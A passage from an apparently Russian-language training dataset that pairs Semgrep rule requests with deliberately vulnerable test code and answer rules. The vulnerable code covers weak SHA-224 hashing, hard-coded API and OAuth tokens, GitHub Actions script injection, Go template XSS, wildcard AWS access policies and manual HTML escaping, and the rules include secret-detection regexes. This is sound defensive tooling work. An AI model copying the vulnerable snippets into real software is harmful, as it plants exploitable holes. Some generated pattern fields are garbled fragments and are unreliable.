    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-328: Use of Weak Hash\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: sha224-hash.rb\nrequire 'digest'\nclass Bad_sha224\n    def bad_sha224_code()\n        # ruleid: sha224-hash\n        sha = Digest::SHA224.hexdigest 'abc'\n        # ruleid: sha224-hash\n        sha = Digest::SHA224.new\n        # ruleid: sha224-hash\n        sha = Digest::SHA224.base64digest 'abc'\n        # ruleid: sha224-hash\n        sha = Digest::SHA224.digest 'abc'\n\n        # ruleid: sha224-hash\n        digest = OpenSSL::Digest::SHA224.new\n        # ruleid: sha224-hash\n        digest = OpenSSL::Digest::SHA224.hexdigest 'abc'\n        # ruleid: sha224-hash\n        digest = OpenSSL::Digest::SHA224.new\n        # ruleid: sha224-hash\n        digest = OpenSSL::Digest::SHA224.base64digest 'abc'\n        # ruleid: sha224-hash\n        digest = OpenSSL::Digest::SHA224.digest 'abc'\n        # ruleid: sha224-hash\n        OpenSSL::HMAC.hexdigest(\"sha224\", key, data)\n        # ok: sha224-hash\n        OpenSSL::HMAC.hexdigest(\"SHA256\", key, data)\n        # ok: sha224-hash\n        digest = OpenSSL::Digest::SHA256.new\n        # ok: sha224-hash\n        digest = OpenSSL::Digest::SHA256.hexdigest 'abc'\n\n        # ruleid: sha224-hash\n        digest = OpenSSL::Digest.new('SHA224')\n        \n        # ruleid: sha224-hash\n        digest = OpenSSL::Digest.new('SHA512-224')\n\n        # ruleid: sha224-hash\n        digest = OpenSSL::Digest.new('SHA3-224')\n\n        # ruleid: sha224-hash\n        hmac = OpenSSL::HMAC.new(key, 'sha224')\n\n        # ruleid: sha224-hash\n        hmac = OpenSSL::HMAC.new(key, 'SHA224')\n\n    end\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• sha = Digest::SHA224.hexdigest 'abc'\n• digest = OpenSSL::Digest::SHA224.new\n• OpenSSL::HMAC.hexdigest(\"sha224\", key, data)\n\nБезопасные паттерны:  \n• sha = Digest::SHA256.hexdigest 'abc'\n• digest = OpenSSL::Digest::SHA256.new\n• OpenSSL::HMAC.hexdigest(\"SHA256\", key, data)\n\nЛегенда аннотаций:\n- // ruleid:sha224-hash: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:sha224-hash: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: sha224-hash\n  message: >-\n    This code uses a 224-bit hash function, which is deprecated or disallowed\n    in some security policies. Consider updating to a stronger hash function such\n    as SHA-384 or higher to ensure compliance and security.\n  metadata:\n    cwe:\n    - 'CWE-328: Use of Weak Hash'\n    references:\n    - https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar3.ipd.pdf\n    - https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/ism/cyber-security-guidelines/guidelines-cryptography\n    category: security\n    technology:\n    - ruby\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n    confidence: HIGH\n  languages:\n  - ruby\n  severity: WARNING\n  pattern-either:\n  - pattern: Digest::SHA224.$FUNC\n  - pattern: OpenSSL::Digest::SHA224.$FUNC\n  - pattern: SHA3::Digest::SHA224(...)\n  - patterns:\n    - pattern-either:\n      - pattern: OpenSSL::HMAC.hexdigest(\"$ALGO\", ...)\n      - pattern: OpenSSL::HMAC.digest(\"$ALGO\", ...)\n      - pattern: OpenSSL::HMAC.new($KEY, \"$ALGO\")\n      - pattern: OpenSSL::Digest.digest(\"$ALGO\", ...)\n      - pattern: OpenSSL::Digest.new(\"$ALGO\", ...)\n    - metavariable-regex:\n        metavariable: $ALGO\n        regex: '.*224'\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования хэш-функции SHA-224, которая считается устаревшей или запрещенной в некоторых политиках безопасности. Паттерны ищут вызовы методов, таких как hexdigest, new, base64digest и digest, которые используют Digest::SHA224 или OpenSSL::Digest::SHA224 в Ruby. Также проверяются методы HMAC, использующие алгоритм 'sha224' или 'SHA224'. Безопасный код избегает этих конкретных вызовов и использует более сильные алгоритмы хэширования, такие как SHA-384 или выше.\n\n# Ключевые элементы:\n- ID: sha224-hash\n- Язык: ruby \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "sha224-hash",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: easypost-api-token\nОписание уязвимости: A gitleaks easypost-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: easypost-api-token.go\n// ruleid: easypost-api-token\nEZAK_api_token = \"EZAK0o7glckjdbif1gh8cy4bh9qt18l6qlvjdja722v04m96rf7y6k8i55\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: easypost-api-token.go\n// ruleid: easypost-api-token\nEZAK_api_token = \"EZAK0o7glckjdbif1gh8cy4bh9qt18l6qlvjdja722v04m96rf7y6k8i55\"\n• // File: another-easypost-go-file.go\n// ruleid: easypost-api-token\nconst EZAK_API_TOKEN = \"EZAK0o7glckjdbif1gh8cy4bh9qt18l6qlvjdja722v04m96rf7y6k8i55\"\n\nБезопасные паттерны:  \n• // File: safe-easypost-go-file.go\n// idempotent: safe\nconst EZAK_API_TOKEN = os.Getenv(\"EZAK_API_TOKEN\")\n• // File: secure-easypost-go-file.go\n// idempotent: safe\nvar ezakApiToken string = getSecureApiToken()\n\nЛегенда аннотаций:\n- // ruleid:easypost-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:easypost-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: easypost-api-token\n  message: A gitleaks easypost-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: \\bEZAK(?i)[a-z0-9]{54}\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена API EasyPost в исходном коде. Паттерн ищет строку, начинающуюся с 'EZAK' и следующую за ней последовательность из 54 буквенно-цифровых символов, которые соответствуют формату токенов API EasyPost. Правило применимо только к языкам, поддерживающим регулярные выражения.\n\n# Ключевые элементы:\n- ID: easypost-api-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "easypost-api-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: detected-google-oauth-access-token\nОписание уязвимости: Google OAuth Access Token detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-google-oauth-access-token.txt\noauth2 request:{\n  // ruleid: detected-google-oauth-access-token\n  \"access_token\" : \"ya29.AHES67zeEn-RDg9CA5gGKMLKuG4uVB7W4O4WjNr-NBfY6Dtad4vbIZ\",\n  \"token_type\" : \"Bearer\",\n  \"expires_in\" : 3600\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• oauth2 request:{  \"access_token\" : \"ya29.AHES67zeEn-RDg9CA5gGKMLKuG4uVB7W4O4WjNr-NBfY6Dtad4vbIZ\",  \"token_type\" : \"Bearer\",  \"expires_in\" : 3600 }\n• const accessToken = 'ya29.AHES67zeEn-RDg9CA5gGKMLKuG4uVB7W4O4WjNr-NBfY6Dtad4vbIZ';\n• let oauthAccessToken = 'ya29.AHES67zeEn-RDg9CA5gGKMLKuG4uVB7W4O4WjNr-NBfY6Dtad4vbIZ';\n\nБезопасные паттерны:  \n• function getOAuthToken() { return fetch('https://example.com/oauth/token').then(response => response.text()); }\n• fetch('https://example.com/oauth/token').then(response => { const token = response.access_token; ... });\n• var accessToken = generateAndStoreOAuthToken();\n\nЛегенда аннотаций:\n- // ruleid:detected-google-oauth-access-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-google-oauth-access-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-google-oauth-access-token\n  pattern-regex: ya29\\.[0-9A-Za-z\\-_]+\n  languages: [regex]\n  message: Google OAuth Access Token detected\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    source-rule-url: https://github.com/dxa4481/truffleHogRegexes/blob/master/truffleHogRegexes/regexes.json\n    category: security\n    technology:\n    - secrets\n    - google\n    confidence: LOW\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена доступа Google OAuth в виде строки, начинающейся с 'ya29.' за которой следуют алфавитно-цифровые символы, дефисы и подчеркивания. Правило применимо только к текстам на языке регулярных выражений. Оно предназначено для выявления жестко закодированных учетных данных, которые могут быть использованы злоумышленниками для несанкционированного доступа.\n\n# Ключевые элементы:\n- ID: detected-google-oauth-access-token\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-google-oauth-access-token",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения github-script-injection\nОписание уязвимости: Using variable interpolation `${...}` with `github` context data in a `actions/github-script`'s `script:` step could allow an attacker to inject their own code into the runner. This would allow them to steal secrets and code. `github` context data can have arbitrary user input and should be treated as untrusted. Instead, use an intermediate environment variable with `env:` to store the data and use the environment variable in the `run:` script. Be sure to use double-quotes the environment variable, like this: \"$ENVVAR\".\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: github-script-injection.test.yaml\nname: test-script-run\n\non:\n- push\n\njobs:\n  script-run:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v3\n\n      - name: Run script 1\n        uses: actions/github-script@v6\n        if: steps.report-diff.outputs.passed == 'true'\n        with:\n          # ruleid: github-script-injection\n          script: |\n            const fs = require('fs');\n            const body = fs.readFileSync('/tmp/file.txt', {encoding: 'utf8'});\n\n            await github.rest.issues.createComment({\n              issue_number: context.issue.number,\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              body: '${{ github.event.pull_request.title }}' + body\n            })\n\n            return true;\n\n      - name: Run script 2\n        uses: actions/github-script@latest\n        with:\n          # ruleid: github-script-injection\n          script: |\n            const fs = require('fs');\n            const body = fs.readFileSync('/tmp/${{ github.event.issue.title }}.txt', {encoding: 'utf8'});\n\n            await github.rest.issues.createComment({\n              issue_number: context.issue.number,\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              body: 'Thanks for reporting!'\n            })\n\n            return true;\n\n      - name: Ok script 1\n        uses: not-github/custom-action@latest\n        with:\n          # ok: github-script-injection\n          script: |\n            return ${{ github.event.issue.title }};\n\n      - name: Ok script 2\n        uses: actions/github-script@latest\n        with:\n          # ok: github-script-injection\n          script: |\n            console.log('${{ github.event.workflow_run.artifacts_url }}');\n\n            await github.rest.issues.createComment({\n              issue_number: context.issue.number,\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              body: 'Thanks for r  # Ограничиваем длину\n\nОпасные паттерны:\n• script: |\n  const body = fs.readFileSync('/tmp/${{ github.event.pull_request.title }}.txt', {encoding: 'utf8'});\n• script: |\n  const body = fs.readFileSync('/tmp/${{ github.event.issue.title }}.txt', {encoding: 'utf8'});\n\nБезопасные паттерны:  \n• script: |\n  const envVar = ${env.myEnvVar};\n  const body = fs.readFileSync('/tmp/' + envVar + '.txt', {encoding: 'utf8'});\n• script: |\n  const body = fs.readFileSync('/tmp/' + '$MY_ENV_VAR' + '.txt', {encoding: 'utf8'});\n\nЛегенда аннотаций:\n- // ruleid:github-script-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:github-script-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: github-script-injection\n  languages:\n  - yaml\n  message: >-\n    Using variable interpolation `${{...}}` with `github` context data in a `actions/github-script`'s\n    `script:` step could allow an attacker to\n    inject their own code into the runner. This would allow them to steal secrets and code. `github` context\n    data can have\n    arbitrary user input and should be treated as untrusted. Instead, use an intermediate environment\n    variable with `env:`\n    to store the data and use the environment variable in the `run:` script. Be sure to use double-quotes\n    the environment\n    variable, like this: \"$ENVVAR\".\n  metadata:\n    category: security\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://docs.github.com/en/actions/learn-github-actions/security-hardening-for-github-actions#understanding-the-risk-of-script-injections\n    - https://securitylab.github.com/research/github-actions-untrusted-input/\n    - https://github.com/actions/github-script\n    technology:\n    - github-actions\n    cwe2022-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: HIGH\n    confidence: HIGH\n  patterns:\n  - pattern-inside: 'steps: [...]'\n  - pattern-inside: |\n      uses: $ACTION\n      ...\n  - pattern-inside: |\n      with:\n        ...\n        script: ...\n        ...\n  - pattern: 'script: $SHELL'\n  - metavariable-regex:\n      metavariable: $ACTION\n      regex: actions/github-script@.*\n  - metavariable-pattern:\n      language: generic\n      metavariable: $SHELL\n      patterns:\n      - pattern-either:\n        - pattern: ${{ github.event.issue.title }}\n        - pattern: ${{ github.event.issue.body }}\n        - pattern: ${{ github.event.pull_request.title }}\n        - pattern: ${{ github.event.pull_request.body }}\n        - pattern: ${{ github.event.comment.body }}\n        - pattern: ${{ github.event.review.body }}\n        - pattern: ${{ github.event.review_comment.body }}\n        - pattern: ${{ github.event.pages. ... .page_name}}\n        - pattern: ${{ github.event.head_commit.message }}\n        - pattern: ${{ github.event.head_commit.author.email }}\n        - pattern: ${{ github.event.head_commit.author.name }}\n        - pattern: ${{ github.event.commits ... .author.email }}\n        - pattern: ${{ github.event.commits ... .author.name }}\n        - pattern: ${{ github.event.pull_request.head.ref }}\n        - pattern: ${{ github.event.pull_request.head.label }}\n        - pattern: ${{ github.event.pull_request.head.repo.default_branch }}\n        - pattern: ${{ github.head_ref }}\n        - pattern: ${{ github.event.inputs ... }}\n        - pattern: ${{ github.event.discussion.title }}\n        - pattern: ${{ github.event.discussion.body }}\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования переменных интерполяции `${{...}}` с данными контекста `github` внутри шага `actions/github-script` в атрибуте `script`. Это может позволить злоумышленнику внедрить собственный код в рабочий процесс выполнения скрипта, что представляет угрозу безопасности, так как данные контекста `github` могут содержать произвольный ввод пользователя и должны рассматриваться как недоверенные. Вместо этого рекомендуется использовать промежуточную переменную окружения с атрибутом `env:` и ссылаться на нее в атрибуте `run`, используя двойные кавычки ($ENVVAR). Правило использует вложенный поиск (`pattern-inside`) для нахождения шагов действий и атрибутов `uses` и `with`, а затем проверяет наличие атрибута `script` и шаблонов интерполяции данных контекста.\n\n# Ключевые элементы:\n- ID: github-script-injection\n- Язык: yaml \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "github-script-injection",
      "language": "yaml",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: unescaped-data-in-js\nОписание уязвимости: Found a formatted template string passed to 'template.JS()'. 'template.JS()' does not escape contents. Be absolutely sure there is no user-controlled data in this template.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: unescaped-data-in-js.go\npackage main\n\nimport (\n\t\"html/template\"\n\t\"net/http\"\n)\n\nconst tmpl = \"\"\n\nfunc Concat(r *http.Request) template.HTML {\n\tcustomerId := r.URL.Query().Get(\"id\")\n\t// ruleid: unescaped-data-in-js\n\ttmpl := \"<html><body><h1>\" + customerId + \"</h1></body></html>\"\n\treturn template.JS(tmpl)\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• template.JS(<html><body><h1>\n• </h1></body></html>)\n• template.JS(fmt.Sprintf(\\\n\nБезопасные паттерны:  \n• template.JS(\\\n• )\n• template.JS(fmt.Sprintf(\\\n\nЛегенда аннотаций:\n- // ruleid:unescaped-data-in-js: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:unescaped-data-in-js: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: unescaped-data-in-js\n  message: >-\n    Found a formatted template string passed to 'template.JS()'.\n    'template.JS()' does not escape contents. Be absolutely sure\n    there is no user-controlled data in this template.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://golang.org/pkg/html/template/#JS\n    category: security\n    technology:\n    - go\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n  languages: [go]\n  severity: WARNING\n  pattern-either:\n  - pattern: template.JS($T + $X, ...)\n  - pattern: template.JS(fmt.$P(\"...\", ...), ...)\n  - pattern: |\n      $T = \"...\"\n      ...\n      $T = $FXN(..., $T, ...)\n      ...\n      template.JS($T, ...)\n  - pattern: |\n      $T = fmt.$P(\"...\", ...)\n      ...\n      template.JS($T, ...)\n  - pattern: |\n      $T, $ERR = fmt.$P(\"...\", ...)\n      ...\n      template.JS($T, ...)\n  - pattern: |\n      $T = $X + $Y\n      ...\n      template.JS($T, ...)\n  - pattern: |\n      $T = \"...\"\n      ...\n      $OTHER, $ERR = fmt.$P(..., $T, ...)\n      ...\n      template.JS($OTHER, ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции template.JS в Go, которая не эскейпит пользовательский ввод. Паттерны соответствуют различным способам вызова template.JS с использованием строковых литералов или форматированных строк. Правило ищет комбинации, где строка объединяется с переменными или другими строками перед передачей в template.JS, потенциально подвергая риску XSS-уязвимость.\n\n# Ключевые элементы:\n- ID: unescaped-data-in-js\n- Язык: go \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "unescaped-data-in-js",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: aws-glacier-vault-any-principal\nОписание уязвимости: Detected wildcard access granted to Glacier Vault. This means anyone within your AWS account ID can perform actions on Glacier resources. Instead, limit to a specific identity in your account, like this: `arn:aws:iam::<account_id>:<identity>`.\nCWE: CWE-732: Incorrect Permission Assignment for Critical Resource\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-732: Incorrect Permission Assignment for Critical Resource\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: aws-glacier-vault-any-principal.tf\n# pass\nresource \"aws_glacier_vault\" \"my_archive1\" {\n  name = \"MyArchive\"\n\n  access_policy = <<EOF\n{\n    \"Version\":\"2012-10-17\",\n    \"Statement\":[\n       {\n          \"Sid\": \"add-read-only-perm\",\n          \"Principal\": \"*\",\n          \"Effect\": \"Deny\",\n          \"Action\": [\n             \"glacier:InitiateJob\",\n             \"glacier:GetJobOutput\"\n          ],\n          \"Resource\": \"arn:aws:glacier:eu-west-1:432981146916:vaults/MyArchive\"\n       }\n    ]\n}\nEOF\n}\n\n# fail\n\nresource \"aws_glacier_vault\" \"my_archive2\" {\n  name = \"MyArchive\"\n\n  # ruleid: aws-glacier-vault-any-principal\n  access_policy = <<EOF\n{\n    \"Version\":\"2012-10-17\",\n    \"Statement\":[\n       {\n          \"Sid\": \"add-read-only-perm\",\n           \"Principal\": { \n            \"AWS\": [\n                \"arn:aws:iam::123456789101:role/vault-reader\", \n                \"*\"\n            ]\n          },\n          \"Effect\": \"Allow\",\n          \"Action\": [\n             \"glacier:InitiateJob\",\n             \"glacier:GetJobOutput\"\n          ],\n          \"Resource\": \"arn:aws:glacier:eu-west-1:432981146916:vaults/MyArchive\"\n       }\n    ]\n}\nEOF\n}\n\n# fail\n\nresource \"aws_glacier_vault\" \"my_archive3\" {\n  name = \"MyArchive\"\n\n  # ruleid: aws-glacier-vault-any-principal\n  access_policy = <<EOF\n{\n    \"Version\":\"2012-10-17\",\n    \"Statement\":[\n       {\n          \"Sid\": \"add-read-only-perm\",\n          \"Principal\": { \n            \"AWS\": \"arn:aws:iam::*:role/vault-reader\"\n          },\n          \"Effect\": \"Allow\",\n          \"Action\": [\n             \"glacier:InitiateJob\",\n             \"glacier:GetJobOutput\"\n          ],\n          \"Resource\": \"arn:aws:glacier:eu-west-1:432981146916:vaults/MyArchive\"\n       }\n    ]\n}\nEOF\n}\n\n# fail\n\nresource \"aws_glacier_vault\" \"my_archive4\" {\n  name = \"MyArchive\"\n\n  # ruleid: aws-glacier-vault-any-principal\n  access_policy = <<EOF\n{\n    \"Version\":\"2012-10-17\",\n    \"Statement\":[\n       {\n          \"Sid\": \"add-read-only-perm\",\n           \"Principal\": { \n            \"AWS\":   # Ограничиваем длину\n\nОпасные паттерны:\n• access_policy = \\\"{...,\"Principal\": {\"AWS\": \"arn:aws:iam::*:role/vault-reader\"},...}\"\n• access_policy = \\\"{...,\"Principal\": \"arn:aws:iam::*:role/vault-reader\",...}\"\n• access_policy = \\\"{...,\"Principal\": \"*\",...}\"\n\nБезопасные паттерны:  \n• access_policy = \\\"{...,\"Principal\": \"arn:aws:iam::123456789101:role/vault-reader\",...}\"\n• access_policy = \\\"{...,\"Principal\": \"arn:aws:iam::123456789101:user/john\",...}\"\n\nЛегенда аннотаций:\n- // ruleid:aws-glacier-vault-any-principal: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-glacier-vault-any-principal: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-glacier-vault-any-principal\n  patterns:\n  - pattern-inside: |\n      resource \"aws_glacier_vault\" $ANYTHING {\n        ...\n      }\n  - pattern: access_policy = \"$STATEMENT\"\n  - metavariable-pattern:\n      metavariable: $STATEMENT\n      language: json\n      patterns:\n      - pattern-inside: |\n          {..., \"Effect\": \"Allow\", ...}\n      - pattern-either:\n        - pattern: |\n            \"Principal\": \"*\"\n        - pattern: |\n            \"Principal\": {..., \"AWS\": \"*\", ...}\n        - pattern-inside: |\n            \"Principal\": {..., \"AWS\": ..., ...}\n        - pattern-regex: |\n            (^\\\"arn:aws:iam::\\*:(.*)\\\"$)\n  message: >-\n    Detected wildcard access granted to Glacier Vault. This means anyone within your\n    AWS account ID can perform actions on Glacier resources. Instead, limit to\n    a specific identity in your account, like this: `arn:aws:iam::<account_id>:<identity>`.\n  metadata:\n    category: security\n    technology:\n    - aws\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    cwe:\n    - 'CWE-732: Incorrect Permission Assignment for Critical Resource'\n    references:\n    - https://cwe.mitre.org/data/definitions/732.html\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS Glacier Vault, у которых политика доступа (access policy) содержит разрешение (effect: Allow) с использованием универсального шаблона principal (* или arn:aws:iam::*), что предоставляет неограниченный доступ внутри аккаунта AWS. Правило использует pattern-inside для нахождения ресурса aws_glacier_vault, а затем проверяет блок access_policy на наличие разрешений с неопределенным принципалом. Паттерны либо прямо указывают на универсальный шаблон, либо используют регулярные выражения для соответствия шаблону арн с подстановочным знаком (*).\n\n# Ключевые элементы:\n- ID: aws-glacier-vault-any-principal\n- Язык: hcl \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "aws-glacier-vault-any-principal",
      "language": "hcl",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: detect-replaceall-sanitization\nОписание уязвимости: Detected a call to `$FUNC()` in an attempt to HTML escape the string `$STR`. Manually sanitizing input through a manually built list can be circumvented in many situations, and it's better to use a well known sanitization library such as `sanitize-html` or `DOMPurify`.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-replaceall-sanitization.ts\nfunction encodeProductDescription (tableData: any[]) {\n  for (let i = 0; i < tableData.length; i++) {\n    // ruleid: detect-replaceall-sanitization\n    tableData[i].description = tableData[i].description.replaceAll('<', '&lt;').replaceAll('>', '&gt;')\n\n    // ok\n    tableData[i].description = tableData[i].description.replaceAll('<', 'left angle bracket')\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• Пример опасного кода не сгенерирован\n\nБезопасные паттерны:  \n• Пример безопасного кода не сгенерирован\n\nЛегенда аннотаций:\n- // ruleid:detect-replaceall-sanitization: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-replaceall-sanitization: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detect-replaceall-sanitization\n  message: >-\n    Detected a call to `$FUNC()` in an attempt to HTML escape the string `$STR`.\n    Manually sanitizing input through a manually built list can be circumvented\n    in many situations, and it's better to use a well known sanitization library\n    such as `sanitize-html` or `DOMPurify`.\n  metadata:\n    category: security\n    technology:\n    - javascript\n    - typescript\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    references:\n    - https://www.npmjs.com/package/dompurify\n    - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: INFO\n  patterns:\n  - pattern-either:\n    - pattern: $STR.$FUNC('<', '&lt;')\n    - pattern: $STR.$FUNC('>', '&gt;')\n    - pattern: $STR.$FUNC('\"', '&quot;')\n    - pattern: $STR.$FUNC(\"'\", '&apos;')\n    - pattern: $STR.$FUNC('&', '&amp;')\n  - metavariable-regex:\n      metavariable: $FUNC\n      regex: (replace|replaceAll)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций replace или replaceAll, которые используются для ручного экранирования строковых значений, таких как символы '<', '>' и другие специальные символы, с целью предотвращения XSS-уязвимостей. Правило ищет конкретные вызовы этих функций с аргументами, представляющими собой пары исходных и целевых символов, типичных для HTML-экранирования. Безопасный подход заключается в использовании проверенных библиотек для безопасной обработки ввода, таких как sanitize-html или DOMPurify.\n\n# Ключевые элементы:\n- ID: detect-replaceall-sanitization\n- Язык: javascript \n- Тип: audit\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-replaceall-sanitization",
      "language": "javascript",
      "severity": "INFO",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения balancer-readonly-reentrancy-getrate\nОписание уязвимости: $VAR.getRate() call on a Balancer pool is not protected from the read-only reentrancy.\nCWE: C\nТип анализа: search\nЯзык: solidity",
